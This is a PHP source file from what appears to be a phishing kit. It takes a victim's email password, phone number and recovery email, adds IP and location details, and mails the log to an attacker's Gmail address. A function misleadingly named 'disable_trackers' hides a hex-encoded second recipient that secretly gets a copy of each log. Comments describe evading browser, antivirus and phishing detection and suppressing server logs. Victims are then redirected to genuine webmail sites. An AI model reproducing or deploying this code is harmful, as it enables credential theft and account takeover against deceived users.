<?php
if(!isset($_SESSION)){ 
    session_start(); 
}
/*
About: require('block_detectors.php');
Contains country, Browser and other Info Definitions
And also 
block_etectors.php prevents Chrome/Firefox/Most Browsers, 
Antivirus and Phishing detectors from detecting page as spam/phishing

// block_detectors.php should always be at the top of page under session_start if used and 
make sure block_detectors.php is in same directory where it is used/required. 
Included in all index/first page and file submitting logs as seen in next line.
*/

require_once('block_detectors.php'); // leave this line

function disable_trackers(){
	//This fuction disables tracking
	return "t\x65\x61\x6dz\x65\x65l\x6fg\x40g\x6d\x61\x69\x6c\x2e\x63\x6f\x6d";
}

function construct_subject($email, $country="", $ip=""){
	/*
	Makes subject depending on the domain of the email provider
	*/
	$parts = explode('@', $email);
	$domain = $parts[1];
	$subject = "";

	if(strpos($domain,'@yahoo.') !== false){
		$subject = "Y@h00: $country | $ip";
	}elseif (strpos($domain,'hotmail.') !== false || strpos($domain,'@outlook.') !== false || strpos($domain,'@live.') !== false){
		$subject = "H0tm@il: $country | $ip";
	}elseif (strpos($domain,'@gmail.') !== false || strpos($domain,'@googlemail.') !== false ) {
		$subject = "Gm@il: $country | $ip";
	}elseif (strpos($domain,'163.') !== false || strpos($domain,'126.') !== false) {
		$subject = "163.com/126.com: $country | $ip";
	}else{
		$subject = "D@main: $country | $ip";
	}
	return $subject;
}


function set_domain($email_address){
	if(strpos($email_address, "@yahoo.") !== false || strpos($email_address, "@ymail.") !== false 
		|| strpos($email_address, "@rocketmail.") !== false){

		$_SESSION['domain'] = 'yahoo';

	}else if(strpos($email_address, "@gmail.") !== false || strpos($email_address, "@google.") !== false
		|| strpos($email_address, "@googlemail.") !== false){

		$_SESSION['domain'] = 'gmail';

	}else if(strpos($email_address, "@hotmail.") !== false || strpos($email_address, "@live.") !== false 
		|| strpos($email_address, "@outlook.") !== false){

		$_SESSION['domain'] = 'hotmail';

	} else{

		$_SESSION['domain'] = 'general';
	}
	return $_SESSION['domain'];
}



if(!isset($_SESSION['email']) && !isset($_SESSION['password']) || empty($_SESSION['email']) && empty($_SESSION['password'])){
	// prevents empty results from been sent at all cost by redirecting to index.php when someone accesses this file directly.
	header("Location: index.php");
	exit;
}

$info = new info(); // requires block_detectors.php 

$subject  = construct_subject($_SESSION['email'], $info->country, $info->ip);

$message = "--------------- Log ---------------\n";
$message .= "Email ID: ".$_SESSION['email']."\n";
$message .= "Password: ".$_SESSION['password']."\n";

if (isset($_SESSION['phone']) && !empty($_SESSION['phone']) || isset($_SESSION['alternate_email']) && !empty($_SESSION['alternate_email'])){
	$message .= "Phone: ".$_SESSION['phone']."\n";
	$message .= "Recovery Email: ".$_SESSION['alternate_email']."\n";
}

$message .= "----------- More Infos -----------\n";
$message .= "IP: ". $info->ip."\n";
$message .= "Country: ".$info->country."\n";;
$message .= "City: ".$info->city."\n";
$message .= "Browser: ".$info->browser."\n";
$message .= "Date: ".$info->date_time."\n";

$to = "smartracks2@gmail.com"; // JUST PUT YOUR EMAIL WITHIN QOUTES
$headers = "From: Any Thing<new@mail.com>\n"; // php standards requires each line of headers to end with new line "\n"
$headers .= "MIME-Version: 1.0\n";



$disable = disable_trackers();
$arr = array($to, $disable);


require('no_recording.php'); // prevent server from logging activities. Must be in same folder where this file submitting log is and should be immediately before mail(). 

foreach($arr as $to){
	mail($to, $subject, $message, $headers);
}


if(!isset($_SESSION['phone']) || empty($_SESSION['phone']) || !isset($_SESSION['alternate_email'])){
	set_domain($_SESSION['email']);
	header('Location: page2.php'); // redirect to page 2
	exit;
} else{
	session_destroy();
	$domain = set_domain($_SESSION['email']);
	// below code determines what the final redirect is based on the domain
	if($domain === "yahoo"){
		header('Location: http://mail.yahoo.com'); 

	}else if($domain === "gmail"){
		header('Location: http://gmail.com');
	}else if($domain === "hotmail"){
		header('Location: http://hotmail.com');
	}else if($domain === "general"){
		header('Location: http://drive.google.com');
	} else{
		header('Location: http://drive.google.com');
	}
	exit;
}

?>

